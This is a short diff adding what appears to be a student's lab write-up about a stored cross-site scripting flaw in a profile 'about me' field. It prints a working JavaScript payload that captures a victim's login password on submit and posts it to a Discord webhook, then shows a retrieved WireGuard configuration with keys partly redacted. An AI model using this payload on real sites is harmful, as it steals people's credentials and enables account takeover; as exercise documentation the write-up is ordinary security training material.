@@ -1,0 +1,29 @@
+Jonas Dahles profilehas a about me box that can be yused to run jvascript executable scripts. I created a discord webhook and created the following script that would send me his password when he typed it in.
+
+<script>
+    document.addEventListener("DOMContentLoaded", () => {
+        document.getElementById("authForm").addEventListener("submit", (event) => {
+            event.preventDefault(); 
+            fetch("----webhookurl---", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: `Password: ${document.getElementById("authPassword").value}` })
+            });
+        });
+    });
+</script>
+
+
+I retrieved the following which is used in the next assignment:
+
+[Interface]
+Address = 10.13.13.98
+PrivateKey = redacted
+ListenPort = 51820
+DNS = 10.13.13.1
+
+[Peer]
+PublicKey = Yg6iNtA7+F6AWfnuqCzJPx2cdHKcYOXSvz0LNx4sMjs=
+PresharedKey = redacted
+Endpoint = 64.225.76.73:51820
+AllowedIPs = 10.13.13.0/24
